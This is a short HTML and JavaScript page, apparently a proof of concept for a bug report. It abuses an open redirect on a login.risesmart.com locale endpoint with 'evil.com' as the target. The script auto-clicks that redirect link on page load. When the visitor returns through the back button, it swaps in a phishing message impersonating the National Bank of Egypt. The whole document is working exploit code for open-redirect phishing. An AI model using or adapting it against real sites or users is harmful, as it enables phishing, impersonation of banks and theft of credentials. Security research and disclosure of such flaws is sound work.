<div id="forward">
    <a href="https://login.risesmart.com/locale/redirect?locale=evil.com">GO BACK PAGE</a>
</div>
<div id="phish">
    This is totally the National Bank of Egypt.
</div>
<script>
function hide(id) {
    document.getElementById(id).style.display = 'none';
}

function show(id) {
    document.getElementById(id).style.display = '';
}

window.addEventListener("pageshow", function () {
    if (performance.navigation.type === performance.navigation.TYPE_BACK_FORWARD) {
        hide("forward");
        show("phish");
    } else {
        hide("phish");
        show("forward");

        document.querySelector("#forward a").click();
    }
});
</script>
